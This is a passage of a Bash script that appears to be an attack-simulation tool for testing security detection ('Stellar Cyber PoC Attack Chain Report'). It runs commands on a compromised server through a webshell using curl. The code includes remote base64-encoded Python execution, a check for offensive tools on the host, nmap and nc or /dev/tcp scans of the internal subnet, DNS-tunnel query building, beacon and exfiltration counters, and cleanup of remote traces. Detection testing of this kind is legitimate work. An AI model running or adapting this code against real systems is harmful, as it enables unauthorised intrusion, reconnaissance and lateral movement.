    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    if ! grep -qxF "${host}" "${cache}" 2>/dev/null; then
        echo "${host}" >> "${cache}"
    fi
}

count_discovered_ips_in_file() {
    local cache="$1" n
    [[ -n "${cache}" && -f "${cache}" && -s "${cache}" ]] || { echo 0; return 0; }
    n=$(awk '/^[0-9]+\./ {print $1}' "${cache}" | safe_count_lines)
    safe_int "${n}"
}

discovery_parse_nmap_stdout() {
    local text="$1" current_host="" line port
    while IFS= read -r line; do
        if [[ "${line}" == *"Nmap scan report for "* ]]; then
            current_host="${line#*Nmap scan report for }"
            current_host="${current_host%%(*}"
            current_host="${current_host// /}"
        elif [[ -n "${current_host}" && "${line}" =~ ^([0-9]+)/tcp[[:space:]]+open ]]; then
            port="${BASH_REMATCH[1]}"
            discovery_cache_append_host "${current_host}" "${port}"
        fi
    done <<< "${text}"
}

discovery_nmap_ports_spec() {
    printf '%s' "22,53,80,443,445,389,8080,8443,6379,9200,27017"
}

discovery_nmap_response_ok() {
    local body="$1"
    [[ "${body}" == *"Nmap scan report for"* || "${body}" == *"/tcp"*"open"* ]] && return 0
    return 1
}

discovery_nmap_missing_in_response() {
    local body="$1"
    [[ "${body}" == *"command not found"* || "${body}" == *"nmap: not found"* || "${body}" == *"No such file or directory"* ]]
}

discovery_parse_probe_stdout() {
    local host="$1" text="$2" line file port
    while IFS= read -r line; do
        if [[ "${line}" =~ ^OK:([^:]+):([0-9]+)$ ]]; then
            port="${BASH_REMATCH[2]}"
            discovery_cache_append_host "${host}" "${port}"
        fi
    done <<< "${text}"
}

discovery_nmap_host_inline() {
    local host="$1" ports cmd body open_lines
    if [[ "${HAS_nmap:-false}" != true ]]; then
        discovery_probe_host_ports "${host}"
        return 1
    fi
    ports=$(discovery_nmap_ports_spec)
    cmd="nmap -Pn -n -T4 -p ${ports} --open ${host}"
    log_message "OK" "Inline nmap (webshell stdout → local cache): ${host}"
    body=$(run_webshell_long "nmap-inline-${host##*.}" "${cmd}" 2>/dev/null || true)
    body=$(normalize_webshell_response "${body}")
    if discovery_nmap_missing_in_response "${body}"; then
        HAS_nmap=false
        log_message "WARN" "nmap not available on webshell host — switching to TCP probe for ${host}"
        add_fallback_usage "Service discovery: nmap missing on webshell host, using nc/bash/curl probes"
        discovery_probe_host_ports "${host}"
        return 1
    fi
    if ! discovery_nmap_response_ok "${body}"; then
        vlog "Inline nmap empty for ${host}; trying TCP probe"
        discovery_probe_host_ports "${host}"
        return 1
    fi
    discovery_parse_nmap_stdout "${body}"
    open_lines=$(awk '/\/tcp open/ {print $1}' <<< "${body}" | tr '\n' ',' | sed 's/\/tcp,//g')
    if [[ -n "${open_lines}" ]]; then
        state_append "discovery_probe.log" "nmap-inline host=${host} open=${open_lines}"
        DISCOVERY_NMAP_INLINE_OK=true
    fi
    dedupe_discovery_local_cache
}

discovery_push_local_cache_to_remote() {
    local f cache b64
    [[ "${DRY_RUN}" == true ]] && return 0
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        [[ -s "${cache}" ]] || continue
        if base64 --help 2>&1 | grep -q '\-w'; then
            b64=$(base64 -w0 < "${cache}")
        else
            b64=$(base64 < "${cache}" | tr -d '\n')
        fi
        run_webshell_quick "push-${f}" \
            "mkdir -p '${REMOTE_RUNTIME_DIR}' && printf '%s' '${b64}' | base64 -d > '${REMOTE_RUNTIME_DIR}/${f}' && sort -u '${REMOTE_RUNTIME_DIR}/${f}' -o '${REMOTE_RUNTIME_DIR}/${f}'" \
            >/dev/null 2>&1 || true
    done
}

run_nmap_discovery_chunked() {
    [[ "${HAS_nmap:-false}" == true ]] || return 0
    local start end chunk="${DISCOVERY_CHUNK_SIZE}" targets body ports
    ports=$(discovery_nmap_ports_spec)
    log_message "OK" "Nmap chunked inline discovery (/24 chunks of ${chunk}, parse stdout locally)"
    for start in $(seq 1 "${chunk}" 254); do
        pipeline_stop_requested && return 130
        end=$((start + chunk - 1))
        (( end > 254 )) && end=254
        targets="${NETWORK_PREFIX}.${start}-${end}"
        log_message "OK" "Nmap chunk ${targets}"
        body=$(run_webshell_long "nmap-chunk-${start}" \
            "nmap -Pn -n -T4 --max-retries 1 --host-timeout 15s -p ${ports} --open ${targets}" 2>/dev/null || true)
        body=$(normalize_webshell_response "${body}")
        if discovery_nmap_missing_in_response "${body}"; then
            HAS_nmap=false
            log_message "WARN" "nmap missing on webshell during chunk scan — stopping nmap chunks"
            add_fallback_usage "Service discovery: nmap missing on webshell host during chunk scan"
            return 1
        fi
        discovery_parse_nmap_stdout "${body}"
    done
    dedupe_discovery_local_cache
    discovery_push_local_cache_to_remote
}

run_fallback_discovery_chunked() {
    local start end chunk="${DISCOVERY_CHUNK_SIZE}"
    log_message "OK" "TCP chunked discovery (nc/bash/curl from webshell, chunks of ${chunk}, timeout=${WEBSHELL_LONG_TIMEOUT}s/chunk)"
    for start in $(seq 1 "${chunk}" 254); do
        pipeline_stop_requested && return 130
        end=$((start + chunk - 1))
        (( end > 254 )) && end=254
        log_message "OK" "TCP probe chunk ${NETWORK_PREFIX}.${start}-${NETWORK_PREFIX}.${end}"
        run_webshell_long "fallback-chunk-${start}" "$(build_remote_service_discovery_chunk "${start}" "${end}")" \
            >/dev/null 2>&1 || true
        discovery_sync_all_host_files >/dev/null
    done
    dedupe_discovery_local_cache
}

log_discovery_diagnostics() {
    local stats total f n
    count_all_discovered_services >/dev/null
    total="${SERVICES_DISCOVERED_TOTAL}"
    log_message "OK" "Discovery results (local cache ${LOCAL_STATE_DIR}/remote_hosts):"
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt; do
        n=0
        if [[ -s "${LOCAL_STATE_DIR}/remote_hosts/${f}" ]]; then
            n=$(count_discovered_ips_in_file "${LOCAL_STATE_DIR}/remote_hosts/${f}")
        fi
        log_message "OK" "  ${f}=${n}"
        if [[ -s "${LOCAL_STATE_DIR}/remote_hosts/${f}" ]]; then
            vlog "  ${f} hosts: $(tr '\n' ' ' < "${LOCAL_STATE_DIR}/remote_hosts/${f}")"
        fi
    done
    log_message "OK" "  services_discovered_total=${total}"
    if (( total == 0 )); then
        log_message "WARN" "Discovery still 0 on ${TARGET_NET} — check ${LOCAL_STATE_DIR}/discovery_probe.log and run a manual probe from the webshell host"
        add_fallback_usage "Discovery empty — verify remote scan from webshell host (not operator host)"
    fi
}

build_remote_dns_random_query() {
    # shellcheck disable=SC2016
    printf '%s' '$(rand_bytes 8 | b64_nw | tr -dc "a-z0-9" | head -c 10).$(rand_bytes 8 | b64_nw | tr -dc "A-Z2-7" | head -c 12).cdn.'"${CAMPAIGN_ID}"'.tunnel.internal'
}

format_capability_matrix() {
    dep_yes_no() { if [[ "${1:-false}" == true ]]; then printf 'yes'; else printf 'no'; fi; }
    local degraded="no" impact="low"
    if read_state_file_or_none "fallback_usage.log" 2>/dev/null | grep -q .; then
        degraded="yes"
        impact="medium"
    fi
    if [[ "${FOLLOWUP_VALIDATION_FAILED}" == true || "${SCAN_ONLY_WARNING}" == true ]]; then
        degraded="yes"
        impact="high"
    fi
    cat <<EOF
Preflight Capability Matrix
- curl=$(dep_yes_no "${HAS_curl:-false}")
- ssh=$(dep_yes_no "${HAS_ssh:-false}")
- dig=$(dep_yes_no "${HAS_dig:-false}")
- smbclient=$(dep_yes_no "${HAS_smbclient:-false}")
- python3=$(dep_yes_no "${HAS_python3:-false}")
- nmap=$(dep_yes_no "${HAS_nmap:-false}")
- webshell_method=${WEBSHELL_METHOD}
- webshell_cmd_style=${WEBSHELL_CMD_STYLE}
- degraded_telemetry=${degraded}
- fallback_in_use=$( [[ -s "${LOCAL_STATE_DIR}/fallback_usage.log" ]] && printf yes || printf no )
- expected_detection_impact=${impact}
EOF
}

format_dependency_matrix() {
    dep_yes_no() { if [[ "${1:-false}" == true ]]; then printf 'yes'; else printf 'no'; fi; }
    cat <<EOF
Detected Dependencies:
- local_curl: $(dep_yes_no "${LOCAL_HAS_CURL}")
- local_xargs_parallel: $(dep_yes_no "${LOCAL_XARGS_PARALLEL_SUPPORTED}")
- remote_xargs_parallel: $(dep_yes_no "${REMOTE_XARGS_PARALLEL_SUPPORTED}")
- remote_bash: $(dep_yes_no "${HAS_bash:-false}")
- remote_shell_bin: ${REMOTE_SHELL_BIN}
- remote_timeout: $(dep_yes_no "${HAS_timeout:-false}")
- python3: $(dep_yes_no "${HAS_python3:-false}")
- nmap: $(dep_yes_no "${HAS_nmap:-false}")
- curl: $(dep_yes_no "${HAS_curl:-false}")
- redis-cli: $(dep_yes_no "${HAS_redis_cli:-false}")
- ldapsearch: $(dep_yes_no "${HAS_ldapsearch:-false}")
- smbclient: $(dep_yes_no "${HAS_smbclient:-false}")
- rpcclient: $(dep_yes_no "${HAS_rpcclient:-false}")
- mongosh: $(dep_yes_no "${HAS_mongosh:-false}")
- mongo: $(dep_yes_no "${HAS_mongo:-false}")
- ssh: $(dep_yes_no "${HAS_ssh:-false}")
- nc: $(dep_yes_no "${HAS_nc:-false}")
EOF
}

run_stage_safe() {
    local label="$1"
    shift
    local rc=0
    pipeline_stop_requested && return 130
    "$@" || rc=$?
    if pipeline_stop_requested; then
        return 130
    fi
    if (( rc != 0 )); then
        set_stage_result "${label}" "Failed" "exit code ${rc}"
        if [[ "${label}" == "Follow-up Validation" ]]; then
            log_message "ERROR" "Stage '${label}' failed (exit ${rc})"
            return "${rc}"
        fi
        log_message "WARN" "Stage '${label}' exited with status ${rc}; continuing pipeline"
        add_fallback_usage "Stage '${label}' non-fatal exit ${rc}"
    fi
    return 0
}

run_pipeline_stage() {
    local label="$1"
    shift
    run_stage_safe "${label}" "$@"
    operator_inter_stage_delay
}

overlap_will_execute() {
    [[ "${AUTO_OVERLAP}" == true && "${DRY_RUN}" == false && -z "${SINGLE_STAGE}" ]]
}

overlap_plan_description() {
    if [[ "${AUTO_OVERLAP}" != true ]]; then
        echo "disabled"
    elif [[ "${DRY_RUN}" == true ]]; then
        echo "planned (beacon + dns in background when not dry-run)"
    elif [[ -n "${SINGLE_STAGE}" ]]; then
        echo "disabled (single-stage mode)"
    else
        echo "active (beacon + dns run in background during pipeline)"
    fi
}

read_state_file_or_none() {
    local file="$1"
    if [[ -s "${LOCAL_STATE_DIR}/${file}" ]]; then
        sort -u "${LOCAL_STATE_DIR}/${file}"
    else
        echo "None"
    fi
}

sum_beacon_count() {
    local n=0
    if [[ -s "${LOCAL_STATE_DIR}/beacon_count.log" ]]; then
        n=$(safe_int "$(wc -l < "${LOCAL_STATE_DIR}/beacon_count.log" | tr -d '[:space:]')")
    fi
    echo "${n}"
}

sum_exfil_count() {
    local n=0
    if [[ -s "${LOCAL_STATE_DIR}/exfil_count.log" ]]; then
        n=$(safe_int "$(wc -l < "${LOCAL_STATE_DIR}/exfil_count.log" | tr -d '[:space:]')")
    fi
    echo "${n}"
}

sum_state_counter() {
    local file="$1" n=0
    if [[ -s "${LOCAL_STATE_DIR}/${file}" ]]; then
        n=$(safe_int "$(wc -l < "${LOCAL_STATE_DIR}/${file}" | tr -d '[:space:]')")
    fi
    echo "${n}"
}

remote_join_args() {
    local out="" arg q
    for arg in "$@"; do
        printf -v q '%q' "$arg"
        out+="${q} "
    done
    printf '%s' "${out% }"
}

# Bootstrap path: plain bash -c (no remote timeout wrapper).
run_webshell_raw() {
    _webshell_invoke "$1" "$2" "bootstrap"
}

run_webshell() {
    _webshell_invoke "$1" "$2" "normal"
}

_webshell_invoke() {
    local context="$1"
    local payload="$2"
    local mode="${3:-normal}"
    local wrapped saved_wrap body http_code payload_bytes curl_max=25 rc=0

    validate_remote_command_isolation "${payload}" || return 1
    payload_bytes=${#payload}
    check_webshell_payload_size "${context}" "${payload_bytes}" || return 1
    saved_wrap="${REMOTE_WRAP_READY}"
    if [[ "${mode}" == "bootstrap" ]]; then
        REMOTE_WRAP_READY=false
    fi
    wrapped=$(wrap_remote_payload "${payload}")
    REMOTE_WRAP_READY="${saved_wrap}"
    if [[ "${VERBOSE}" == true ]]; then
        vlog "Remote context=${context} mode=${mode} bytes=${payload_bytes}"
        vlog "Remote payload=${payload}"
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        echo "[DRY-RUN:${context}] ${payload}"
        return 0
    fi
    case "${mode}" in
        quick) curl_max=10 ;;
        bootstrap) curl_max=15 ;;
        long) curl_max="${WEBSHELL_LONG_TIMEOUT}" ;;
        *) curl_max=25 ;;
    esac
    build_curl_common_args "${curl_max}"
    local args=("${CURL_COMMON_ARGS[@]}")
    if [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
        args+=(--get --data-urlencode "cmd=${wrapped}")
    else
        args+=(--data-urlencode "cmd=${wrapped}")
    fi

    if [[ -n "${WEBSHELL_LOCK_FILE}" && -e "${WEBSHELL_LOCK_FILE}" ]] && command -v flock >/dev/null 2>&1; then
        body=$( (
            flock -w 120 9 || exit 124
            curl "${args[@]}" -w $'\n%{http_code}' "${WEB_SHELL_URL}" 2>/dev/null || printf '\n000'
        ) 9>"${WEBSHELL_LOCK_FILE}" ) || rc=$?
    else
        body=$(curl "${args[@]}" -w $'\n%{http_code}' "${WEB_SHELL_URL}" 2>/dev/null || printf '\n000') || rc=$?
    fi
    http_code="${body##*$'\n'}"
    body="${body%$'\n'*}"
    WEBSHELL_LAST_HTTP_CODE="${http_code}"
    body=$(normalize_webshell_response "${body}")

    if (( rc == 124 )); then
        log_message "WARN" "Webshell lock timeout (120s) at context=${context}"
        add_fallback_usage "Webshell lock timeout at context=${context}"
        return 124
    fi
    if [[ "${VERBOSE}" == true ]]; then
        vlog "Webshell method=${WEBSHELL_METHOD} http=${http_code:-000} response_bytes=${#body}"
    fi
    if [[ -z "${http_code}" || "${http_code}" == "000" ]]; then
        WEBSHELL_SLOW=true
        log_message "WARN" "Webshell request failed (${context}, HTTP ${http_code:-000})"
        add_fallback_usage "Webshell transport issue at context=${context} (HTTP ${http_code:-000})"
    fi
    printf '%s' "${body}"
}

run_remote_python() {
    local context="$1"
    local code="$2"
    local b64 cmd
    b64=$(printf '%s' "${code}" | b64_encode_no_wrap)
    printf -v cmd "python3 -c %q" "import base64;exec(base64.b64decode('${b64}').decode('utf-8'))"
    run_webshell "${context}" "${cmd}" >/dev/null
}

run_remote_python_capture() {
    local context="$1"
    local code="$2"
    local b64 cmd
    b64=$(printf '%s' "${code}" | b64_encode_no_wrap)
    printf -v cmd "python3 -c %q" "import base64;exec(base64.b64decode('${b64}').decode('utf-8'))"
    run_webshell "${context}" "${cmd}" 2>/dev/null | tr -d '\r'
}

write_report_entries() {
    local stage="$1" mitre="$2" src="$3" telemetry="$4" target="$5" status="$6" ctx="$7" ts cycle_num
    status=$(normalize_stage_status "${status}")
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date +"%Y-%m-%dT%H:%M:%SZ")
    cycle_num="${CURRENT_CYCLE:-1}"
    [[ "${DRY_RUN}" == true ]] && return 0
    [[ -n "${TIMELINE_LOG}" ]] && safe_append_file "${TIMELINE_LOG}" \
        "${ts} campaign=${CAMPAIGN_ID} cycle=${cycle_num} stage=${stage} mitre=${mitre} src=${src} type=${telemetry} target=${target} status=${status} ctx=\"${ctx}\""
    if [[ -n "${MITRE_CSV}" ]] && [[ ! -f "${MITRE_CSV}" ]]; then
        safe_write_file "${MITRE_CSV}" "Timestamp,Cycle,Stage,MITRE,Source,Telemetry,Target,Status" || true
    fi
    [[ -n "${MITRE_CSV}" ]] && safe_append_file "${MITRE_CSV}" \
        "${ts},${cycle_num},${stage},${mitre},${src},${telemetry},${target},${status}"
    if [[ -n "${REPORT_MD}" ]] && [[ ! -f "${REPORT_MD}" ]]; then
        safe_write_file "${REPORT_MD}" "# Stellar Cyber PoC Attack Chain Report
**Campaign ID:** ${CAMPAIGN_ID}
**Mode/Profile:** ${MODE}/${PROFILE}

| Timestamp | Cycle | Stage | MITRE | Source | Telemetry | Status |
|---|---|---|---|---|---|---|
" || true
    fi
    [[ -n "${REPORT_MD}" ]] && safe_append_file "${REPORT_MD}" \
        "| ${ts} | ${cycle_num} | ${stage} | ${mitre} | ${src} | ${telemetry} | ${status} |"
}

execute_jitter() {
    [[ "${DRY_RUN}" == true ]] && return 0
    local base
    base=$(awk -v min="${CYCLE_SLEEP_MIN}" -v max="${CYCLE_SLEEP_MAX}" 'BEGIN{srand(); print int(min + rand()*(max-min+1))}')
    randomized_sleep "${base}" "${JITTER_PERCENT}"
}

cleanup_background_jobs() {
    local pid
    [[ "${CLEANUP_DONE}" == true ]] && return 0
    CLEANUP_DONE=true
    stop_all_humanize_workers 2>/dev/null || true
    for pid in "${OVERLAP_PIDS[@]}" "${PIPELINE_OVERLAP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        if kill -0 "${pid}" 2>/dev/null; then
            kill -TERM "${pid}" 2>/dev/null || true
        fi
    done
    sleep 1
    for pid in "${OVERLAP_PIDS[@]}" "${PIPELINE_OVERLAP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    OVERLAP_PIDS=()
    PIPELINE_OVERLAP_PIDS=()
    OVERLAP_BEACON_STARTED=false
    OVERLAP_DNS_STARTED=false
    [[ "${DRY_RUN}" == true ]] && return 0
    if [[ "${KEEP_ARTIFACTS}" == true ]]; then
        return 0
    fi
    cleanup_ephemeral_runtime
}

cleanup_ephemeral_runtime() {
    local rm_cmd
    [[ "${DRY_RUN}" == true ]] && return 0
    if [[ "${KEEP_ARTIFACTS}" == true ]]; then
        return 0
    fi
    if [[ "${CLEANUP_RUNTIME_ON_EXIT}" != true || -z "${REMOTE_RUNTIME_DIR}" ]]; then
        return 0
    fi
    preserve_reports_from_runtime
    if report_path_is_under_runtime "${EFFECTIVE_REPORT_DIR}"; then
        log_message "WARN" "Skipping runtime cleanup: report dir is under remote runtime (${EFFECTIVE_REPORT_DIR})"
        return 0
    fi
    safe_local_rm_runtime_dir
    rm_cmd=$(safe_remote_rm_rf \
        "${REMOTE_STAGING_DIR}" \
        "${REMOTE_FAKE_DIR}" \
        "${REMOTE_STATE_DIR}" \
        "${REMOTE_LOG_DIR}" \
        "${REMOTE_RUNTIME_DIR}") || {
        log_message "WARN" "Ephemeral remote runtime cleanup skipped (no safe paths to remove)"
        return 0
    }
    run_webshell_raw "cleanup-ephemeral-runtime" "${rm_cmd}" >/dev/null 2>&1 || true
}

wait_overlap_jobs() {
    local pid start now timeout_s
    timeout_s=90
    for pid in "${OVERLAP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        pipeline_stop_requested && break
        if ! kill -0 "${pid}" 2>/dev/null; then
            wait "${pid}" 2>/dev/null || true
            continue
        fi
        start=$(date +%s)
        while kill -0 "${pid}" 2>/dev/null; do
            pipeline_stop_requested && break
            now=$(date +%s)
            if (( now - start > timeout_s )); then
                log_message "WARN" "Overlap PID ${pid} timeout, terminating"
                kill -TERM "${pid}" 2>/dev/null || true
                interruptible_sleep 1 || break
                kill -KILL "${pid}" 2>/dev/null || true
                break
            fi
            interruptible_sleep 1 || break
        done
        wait "${pid}" 2>/dev/null || true
        [[ "${VERBOSE}" == true ]] && vlog "Overlap stage completed (pid=${pid})"
    done
    OVERLAP_PIDS=()
    OVERLAP_BEACON_STARTED=false
    OVERLAP_DNS_STARTED=false
}

assess_remote_capabilities() {
    log_message "STAGE" "Remote dependency assessment"
    local bins=("bash" "timeout" "seq" "awk" "nmap" "smbclient" "rpcclient" "ldapsearch" "redis-cli" "mongosh" "mongo" "nc" "ssh" "curl" "python3" "getent" "nslookup" "dig" "ping" "base64" "openssl")
    local b out v
    if [[ "${DRY_RUN}" == true ]]; then
        for b in "${bins[@]}"; do
            v="HAS_${b//-/_}"
            declare -g "${v}=false"
            add_dependency_status "${b}: not checked (dry-run)"
        done
        REMOTE_XARGS_PARALLEL_SUPPORTED=false
        add_dependency_status "remote-xargs_parallel: not checked (dry-run)"
        add_fallback_usage "Dry-run plan: fallback paths preferred where dependencies are unknown"
        return 0
    fi
    for b in "${bins[@]}"; do
        out=$(run_webshell_raw "which-${b}" "command -v ${b} 2>/dev/null || true")
        v="HAS_${b//-/_}"
        if [[ -n "${out}" ]]; then
            declare -g "${v}=true"
            add_dependency_status "${b}: detected"
        else
            declare -g "${v}=false"
            add_dependency_status "${b}: missing"
        fi
    done
    select_remote_shell_bin
    assess_remote_xargs_parallel
    REMOTE_WRAP_READY=true
    add_dependency_status "remote-shell: ${REMOTE_SHELL_BIN}"
    add_dependency_status "remote-wrap: enabled (remote timeout=${HAS_timeout:-false})"
}

discovery_sync_remote_host_file() {
    local file="$1" raw cache tmp
    [[ -z "${file}" || -z "${LOCAL_STATE_DIR}" ]] && { echo 0; return 0; }
    cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    raw=$(run_webshell_quick "sync-${file}" \
        "if [ -f '${REMOTE_RUNTIME_DIR}/${file}' ]; then cat '${REMOTE_RUNTIME_DIR}/${file}'; fi" 2>/dev/null || true)
    raw=$(normalize_webshell_response "${raw}")
    tmp=$(mktemp)
    awk '/^[0-9]+\./ {print $1}' <<< "${raw}" > "${tmp}"
    if [[ -s "${cache}" ]]; then
        awk '/^[0-9]+\./ {print $1}' "${cache}" >> "${tmp}"
    fi
    if [[ -s "${tmp}" ]]; then
        sort -u "${tmp}" -o "${cache}"
    elif [[ ! -s "${cache}" ]]; then
        : > "${cache}"
    fi
    rm -f "${tmp}"
    count_discovered_ips_in_file "${cache}"
}

discovery_sync_all_host_files() {
    local f n total=0
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt \
             usable_http_targets.txt usable_https_targets.txt usable_ssh_hosts.txt usable_smb_hosts.txt usable_dns_hosts.txt; do
        n=$(discovery_sync_remote_host_file "${f}")
        n=$(safe_int "${n}")
        total=$((total + n))
    done
    SERVICES_DISCOVERED_TOTAL="${total}"
    echo "${total}"
}

discovery_probe_one_port() {
    local host="$1" port="$2" file="$3" last="${host##*.}" cmd out
    # Same pattern as manual validation: nc first, then bash /dev/tcp fallback.
    cmd="nc -z -w2 ${host} ${port} && echo OK:${file}:${port} || bash -c \"echo >/dev/tcp/${host}/${port}\" && echo OK:${file}:${port} || true"
    out=$(run_webshell_long "probe-${last}-${port}" "${cmd}" 2>/dev/null || true)
    out=$(normalize_webshell_response "${out}")
    printf '%s\n' "${out}"
}

discovery_probe_host_ports() {
    local host="$1" last probe_out line port_spec port file
    last="${host##*.}"
    log_message "OK" "Direct TCP probe on ${host} from webshell (22/80/443/445/8080; nc/bash)"
    probe_out=""
    for port_spec in \
        "22:ssh_hosts.txt" \
        "80:http_targets.txt" \
        "443:https_targets.txt" \
        "445:smb_hosts.txt" \
        "8080:http_targets.txt"; do
        port="${port_spec%%:*}"
        file="${port_spec#*:}"
        line=$(discovery_probe_one_port "${host}" "${port}" "${file}")
        [[ -n "${line}" ]] && probe_out+="${line}"$'\n'
    done
    probe_out+="$(run_webshell_long "probe-${last}-done" "echo DISCOVERY_PROBE_DONE host=${host}" 2>/dev/null || true)"
    probe_out=$(normalize_webshell_response "${probe_out}")
    discovery_parse_probe_stdout "${host}" "${probe_out}"
    dedupe_discovery_local_cache
    if [[ "${VERBOSE}" == true ]]; then
        vlog "Probe ${host} results: $(printf '%.200s' "${probe_out}" | tr '\n' ' ')"
    fi
    if [[ "${probe_out}" == *"OK:"* ]]; then
        state_append "discovery_probe.log" "tcp-probe host=${host} $(echo "${probe_out}" | tr '\n' ' ')"
    fi
}

get_local_hosts() {
    local file="$1" out cmd cache
    [[ -z "${file}" || -z "${LOCAL_STATE_DIR}" ]] && return 0
    cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
    if [[ "${DRY_RUN}" == true ]]; then
        case "${file}" in
            ssh_hosts.txt) printf '%s\n' "10.10.10.10" "10.10.10.20" ;;
            http_targets.txt) printf '%s\n' "10.10.10.30" "10.10.10.40" ;;
            https_targets.txt) printf '%s\n' "10.10.10.50" ;;
            smb_hosts.txt) printf '%s\n' "10.10.10.60" ;;
            ldap_hosts.txt) printf '%s\n' "10.10.10.70" ;;
            redis_hosts.txt) printf '%s\n' "10.10.10.80" ;;
            elastic_hosts.txt) printf '%s\n' "10.10.10.90" ;;
            mongo_hosts.txt) printf '%s\n' "10.10.10.100" ;;
            dns_hosts.txt) printf '%s\n' "10.10.10.5" "8.8.8.8" ;;
            *) printf '%s\n' "10.10.10.10" ;;
        esac
        return 0
    fi
    if [[ -s "${cache}" ]]; then
        awk '/^[0-9]+\./ {print $1}' "${cache}"
        return 0
    fi
    printf -v cmd "if [ -f %q ]; then cat %q; fi" "${REMOTE_RUNTIME_DIR}/${file}" "${REMOTE_RUNTIME_DIR}/${file}"
    out=$(run_webshell_quick "read-${file}" "${cmd}")
    out=$(normalize_webshell_response "${out}")
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    awk '/^[0-9]+\./ {print $1}' <<< "${out}" | sort -u | tee "${cache}"
}

stage_runtime_validation() {
    add_executed_stage "Runtime Validation"
    local rt_status="Success" rt_reason="" lock_file="${LOCAL_STATE_DIR}/runtime_validation.lock"
    local remote_out=""

    if [[ ! -d "${LOCAL_STATE_DIR}" || ! -w "${LOCAL_STATE_DIR}" ]]; then
        rt_status="Failed"
        rt_reason="local operator state dir not writable: ${LOCAL_STATE_DIR}"
    fi
    if [[ "${rt_status}" == "Success" ]]; then
        if ! atomic_append_file "${LOCAL_STATE_DIR}/runtime_validation.log" "local_state_ok"; then
            rt_status="Partial"
            rt_reason="local state append test failed"
        fi
    fi
    if [[ "${DRY_RUN}" != true && "${rt_status}" == "Success" ]]; then
        remote_out=$(run_webshell_raw "runtime-validation-remote" \
            "mkdir -p '${REMOTE_RUNTIME_DIR}' '${REMOTE_STAGING_DIR}' '${REMOTE_FAKE_DIR}' '${REMOTE_STATE_DIR}' '${REMOTE_LOG_DIR}' && touch '${REMOTE_RUNTIME_DIR}/.runtime_validation' && echo REMOTE_RT_OK")
        if [[ "${remote_out}" != *"REMOTE_RT_OK"* ]]; then
            rt_status="Failed"
            rt_reason="remote runtime not writable: ${REMOTE_RUNTIME_DIR}"
        fi
    elif [[ "${DRY_RUN}" == true ]]; then
        add_fallback_usage "Runtime validation (dry-run): remote path ${REMOTE_RUNTIME_DIR} not probed"
    fi
    if [[ "${rt_status}" == "Success" && -n "${REPORT_MD}" ]]; then
        safe_append_file "${REPORT_MD}" "<!-- runtime validation ok (local+remote) -->" || true
    fi
    if command -v flock >/dev/null 2>&1; then
        { flock -x 202 && printf 'lock-ok\n' >> "${LOCAL_STATE_DIR}/runtime_validation.log"; } 202>"${lock_file}" 2>/dev/null || {
            rt_status="Partial"
            [[ -z "${rt_reason}" ]] && rt_reason="local lock creation test failed"
        }
    fi
    rm -f "${lock_file}" 2>/dev/null || true
    set_stage_result "Runtime Validation" "${rt_status}" "${rt_reason}"
    if [[ "${rt_status}" != "Success" ]]; then
        add_fallback_usage "Runtime validation issue: ${rt_reason}"
    fi
}

stage_initial_foothold() {
    add_executed_stage "Initial Foothold"
    set_stage_result "Initial Foothold" "Success"
    write_report_entries "initial_foothold" "T1190" "EDR/WAF" "Process Spawn" "localhost" "start" "runtime init"
    run_webshell "foothold" "mkdir -p '${REMOTE_RUNTIME_DIR}' '${REMOTE_STAGING_DIR}' '${REMOTE_FAKE_DIR}' '${REMOTE_STATE_DIR}' '${REMOTE_LOG_DIR}' && id && hostname" >/dev/null
    write_report_entries "initial_foothold" "T1190" "EDR/WAF" "Process Spawn" "localhost" "success" "runtime ready"
}

stage_preflight_validation() {
    add_executed_stage "Preflight Validation"
    write_report_entries "preflight_validation" "T1190" "XDR/NDR/EDR" "Environment Validation" "local+remote" "start" "poc preflight checks"
    if [[ "${DRY_RUN}" == true ]]; then
        add_preflight_result "[+] Webshell reachable (simulated)"
        add_preflight_result "[+] Command execution confirmed (simulated)"
        add_preflight_result "[+] Runtime dir writable (simulated)"
        set_stage_result "Preflight Validation" "Success"
        return 0
    fi

    local status_code token cmd_out
    build_curl_common_args 8
    status_code=$(curl "${CURL_COMMON_ARGS[@]}" -sS -o /dev/null -w "%{http_code}" "${WEB_SHELL_URL}" || true)
    if [[ -z "${status_code}" || "${status_code}" == "000" ]]; then
        add_preflight_result "[-] Webshell unreachable"
        set_stage_result "Preflight Validation" "Skipped" "Webshell unreachable"
        log_message "ERROR" "Webshell unreachable"
        exit 1
    fi
    add_preflight_result "[+] Webshell reachable (HTTP ${status_code})"

    token="STELLAR_POC_OK_${RANDOM}"
    if ! detect_webshell_command_style "${token}"; then
        set_stage_result "Preflight Validation" "Skipped" "Command execution failed"
        exit 1
    fi

    cmd_out=$(run_webshell_raw "preflight-cmd-exec" "echo ${token}")
    cmd_out=$(normalize_webshell_response "${cmd_out}")
    if [[ "${cmd_out}" != *"${token}"* ]]; then
        add_preflight_result "[-] Command execution re-check failed"
        set_stage_result "Preflight Validation" "Skipped" "Command execution failed after style detect"
        log_message "ERROR" "Command execution validation failed (post-detect)"
        exit 1
    fi

    cmd_out=$(run_webshell_raw "preflight-runtime-writable" "mkdir -p '${REMOTE_RUNTIME_DIR}' && touch '${REMOTE_RUNTIME_DIR}/.preflight_write_test' && echo WRITABLE_OK")
